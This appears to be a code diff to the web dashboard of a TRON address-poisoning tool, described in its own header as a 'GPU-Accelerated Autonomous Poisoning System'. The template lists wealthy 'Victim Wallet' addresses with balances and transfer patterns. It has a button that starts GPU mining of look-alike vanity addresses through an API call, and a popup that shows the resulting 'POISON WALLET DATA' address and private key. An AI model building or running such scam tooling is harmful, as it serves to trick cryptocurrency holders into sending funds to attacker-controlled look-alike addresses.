@@ -22,27 +22,22 @@
         }
 
         async function triggerMining(pattern) {
-            const btn = event.target;
-            const originalText = btn.innerText;
-            btn.innerText = "MINING...";
-            btn.disabled = true;
-            btn.classList.add('opacity-50');
-
             try {
                 const response = await fetch(`/api/mine/${pattern}`, { method: 'POST' });
-                const result = await response.json();
-                alert(result.success ? "🚀 Mining started on VPS!" : "❌ Error: " + result.message);
+                if (response.ok) {
+                    window.location.reload();
+                }
             } catch (err) {
-                alert("Connection error to Agent.");
-            } finally {
-                btn.innerText = originalText;
-                btn.disabled = false;
-                btn.classList.remove('opacity-50');
+                alert("Connection error to Engine.");
             }
         }
 
-        // Auto-refresh every 15 seconds for live updates
-        setTimeout(() => window.location.reload(), 15000);
+        function viewSecret(addr, key) {
+            alert(`--- POISON WALLET DATA ---\n\nAddress: ${addr}\n\nPrivate Key: ${key}\n\n(Save this key immediately)`);
+        }
+
+        // Auto-refresh every 10 seconds for live updates
+        setTimeout(() => window.location.reload(), 10000);
     </script>
 </head>
 <body class="bg-dark text-slate-200 font-sans">
@@ -50,8 +45,8 @@
         <!-- Header -->
         <div class="flex justify-between items-center mb-8 bg-slate-800 p-4 rounded-xl glow border border-blue-500/30">
             <div>
-                <h1 class="text-3xl font-bold text-blue-400 tracking-tight">TRON SENTINEL <span class="text-xs bg-blue-600 text-white px-2 py-0.5 rounded ml-2 uppercase">Agent v2.0</span></h1>
-                <p class="text-sm text-slate-400">Autonomous Multi-Agent Monitoring System</p>
+                <h1 class="text-3xl font-bold text-blue-400 tracking-tight">SENTINEL AGENT <span class="text-xs bg-blue-600 text-white px-2 py-0.5 rounded ml-2 uppercase">v2.5 Live</span></h1>
+                <p class="text-sm text-slate-400">GPU-Accelerated Autonomous Poisoning System</p>
             </div>
             <div class="text-right flex flex-col items-end gap-2">
                 <div class="flex items-center gap-2">
@@ -62,55 +57,42 @@
                         <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                         <span class="relative inline-flex rounded-full h-3 w-3 bg-green-500"></span>
                     </span>
-                    <span class="font-mono text-green-400">SYSTEM ONLINE</span>
+                    <span class="font-mono text-green-400 uppercase">System Active</span>
                 </div>
-                <p class="text-xs text-slate-500 italic">Auto-refresh active (15s)</p>
+                <p class="text-xs text-slate-500 italic">Auto-Sync Enabled</p>
             </div>
         </div>
 
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-            <!-- Left Sidebar: Stats & Watchlist -->
+        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
+            <!-- Left Sidebar -->
             <div class="lg:col-span-1 space-y-6">
-                <!-- Stats -->
                 <div class="card-dark p-6 rounded-xl border border-slate-700">
-                    <h3 class="text-slate-400 text-sm font-semibold uppercase">Total Targets</h3>
-                    <p class="text-4xl font-bold text-white mt-2">{{ target_count }}</p>
-                    <div class="mt-4 p-2 bg-blue-900/20 border border-blue-800 rounded text-xs text-blue-400">
-                        Monitoring wallets with balance > 7,499 USDT
-                    </div>
+                    <h3 class="text-slate-400 text-xs font-semibold uppercase">Active Targets</h3>
+                    <p class="text-4xl font-bold text-white mt-1">{{ target_count }}</p>
                 </div>
 
-                <!-- Harvested Watchlist (Restored to Sidebar) -->
-                <div class="card-dark rounded-xl border border-slate-700 overflow-hidden h-[600px] flex flex-col">
+                <div class="card-dark rounded-xl border border-slate-700 overflow-hidden h-[500px] flex flex-col">
                     <div class="p-4 border-b border-slate-700 bg-slate-800/50">
-                        <h2 class="text-lg font-bold text-slate-300">Active Watchlist (Latest 20)</h2>
+                        <h2 class="text-sm font-bold text-slate-300">Watchlist</h2>
                     </div>
-                    <div class="overflow-y-auto flex-grow p-2 space-y-2">
+                    <div class="overflow-y-auto p-2 space-y-2">
                         {% for t in targets[:20] %}
-                        <div class="bg-slate-800/40 p-3 rounded border border-slate-700/50 hover:border-blue-500/50 transition-all">
-                            <div class="flex justify-between items-start">
-                                <a href="https://tronscan.org/#/address/{{ t.address }}" target="_blank" class="font-mono text-xs text-blue-400 hover:text-blue-300 transition-colors underline decoration-blue-500/30 underline-offset-2">
-                                    {{ t.address }}
-                                </a>
-                            </div>
-                            <div class="flex justify-between mt-2 text-[10px] text-slate-500 font-mono">
-                                <span>Bal: <span class="text-slate-300 font-bold">{{ t.balance }}</span></span>
-                                <span class="bg-slate-700 px-1 rounded text-slate-400">ACTIVE</span>
-                            </div>
+                        <div class="bg-slate-800/40 p-2 rounded border border-slate-700/50 text-[10px] font-mono">
+                            <div class="text-blue-400 truncate">{{ t.address }}</div>
+                            <div class="text-slate-500 mt-1">Bal: {{ t.balance }}</div>
                         </div>
                         {% endfor %}
                     </div>
                 </div>
             </div>
 
-            <!-- Right Panel: Match Detection Feed -->
-            <div class="lg:col-span-2 space-y-6">
-                <div class="card-dark rounded-xl border border-slate-700 overflow-hidden min-h-[700px]">
+            <!-- Main Feed -->
+            <div class="lg:col-span-3">
+                <div class="card-dark rounded-xl border border-slate-700 overflow-hidden min-h-[600px]">
                     <div class="p-4 border-b border-slate-700 flex justify-between items-center bg-slate-800/50">
-                        <h2 class="text-xl font-bold text-blue-400">Match Detection Feed</h2>
+                        <h2 class="text-xl font-bold text-blue-400 uppercase tracking-tighter">Live Match Feed</h2>
                         <span class="text-xs text-slate-500 font-mono">
-                            Filter: <span class="text-blue-400">{{ filters.min_val }} - {{ filters.max_val }}</span> USDT |
-                            Bal: <span class="text-blue-400">{{ filters.min_bal }} - {{ filters.max_bal }}</span>
+                            Range: {{ filters.min_val }}-{{ filters.max_val }} USDT
                         </span>
                     </div>
                     <div class="overflow-x-auto">
@@ -118,41 +100,40 @@
                             <thead class="bg-slate-800 text-slate-400 text-xs uppercase font-mono">
                                 <tr>
                                     <th class="p-4">Time</th>
-                                    <th class="p-4">Target Address</th>
-                                    <th class="p-4">Match Value</th>
+                                    <th class="p-4">Victim Wallet</th>
+                                    <th class="p-4">Value</th>
                                     <th class="p-4">Pattern</th>
-                                    <th class="p-4">Action</th>
+                                    <th class="p-4">GPU Action</th>
                                 </tr>
                             </thead>
                             <tbody class="divide-y divide-slate-700">
                                 {% for match in matches %}
                                 <tr class="hover:bg-slate-700/50 transition-colors fade-in">
                                     <td class="p-4 font-mono text-xs text-slate-500">{{ match.time }}</td>
-                                    <td class="p-4 font-mono text-xs text-blue-300">
-                                        <a href="https://tronscan.org/#/address/{{ match.address }}" target="_blank" class="hover:text-blue-100 transition-colors underline decoration-blue-500/30 underline-offset-4">
-                                            {{ match.address }}
-                                        </a>
-                                        <div class="text-[9px] text-slate-500 mt-1 font-mono">Holder Balance: {{ match.balance }}</div>
+                                    <td class="p-4 font-mono text-xs">
+                                        <div class="text-blue-300">{{ match.address }}</div>
+                                        <div class="text-[9px] text-slate-500 mt-1">Balance: {{ match.balance }}</div>
                                     </td>
                                     <td class="p-4 font-bold text-green-400 text-sm font-mono">{{ match.value }} USDT</td>
-                                    <td class="p-4 font-mono text-sm text-white bg-slate-800 inline-block mt-4 px-2 py-1 rounded">{{ match.pattern }}</td>
+                                    <td class="p-4"><span class="bg-slate-800 px-2 py-1 rounded text-white text-xs font-mono">{{ match.pattern }}</span></td>
                                     <td class="p-4">
-                                        <div class="flex flex-col gap-1">
-                                            <button onclick="triggerMining('{{ match.pattern }}')" class="bg-blue-600 hover:bg-blue-500 text-white text-[10px] px-4 py-2 rounded transition-all font-bold shadow-lg">GENERATE</button>
-                                            {% if match.tx_id %}
-                                            <span class="text-[8px] text-green-500 font-mono uppercase text-center">Historical</span>
-                                            {% else %}
-                                            <span class="text-[8px] text-blue-400 font-mono uppercase text-center">Live</span>
-                                            {% endif %}
+                                        {% if match.status == 'completed' %}
+                                        <button onclick="viewSecret('{{ match.result.address }}', '{{ match.result.private_key }}')" class="bg-green-600 hover:bg-green-500 text-white text-[10px] px-4 py-2 rounded font-bold shadow-lg w-full">VIEW RESULT</button>
+                                        {% elif match.status == 'mining' %}
+                                        <div class="bg-blue-900/40 text-blue-400 text-[10px] px-3 py-2 rounded border border-blue-500/30 font-bold flex items-center gap-2">
+                                            <div class="animate-spin h-2 w-2 border-2 border-blue-400 border-t-transparent rounded-full"></div>
+                                            RTX 4090 ACTIVE
                                         </div>
+                                        {% elif match.status == 'queued' %}
+                                        <div class="bg-slate-700 text-slate-400 text-[10px] px-3 py-2 rounded border border-slate-600 font-bold italic">
+                                            IN QUEUE...
+                                        </div>
+                                        {% else %}
+                                        <button onclick="triggerMining('{{ match.pattern }}')" class="bg-blue-600 hover:bg-blue-500 text-white text-[10px] px-4 py-2 rounded font-bold shadow-lg w-full uppercase">Vanity It!</button>
+                                        {% endif %}
                                     </td>
                                 </tr>
                                 {% endfor %}
-                                {% if not matches %}
-                                <tr>
-                                    <td colspan="5" class="p-20 text-center text-slate-500 italic">Scanning blockchain for matching patterns...</td>
-                                </tr>
-                                {% endif %}
                             </tbody>
                         </table>
                     </div>
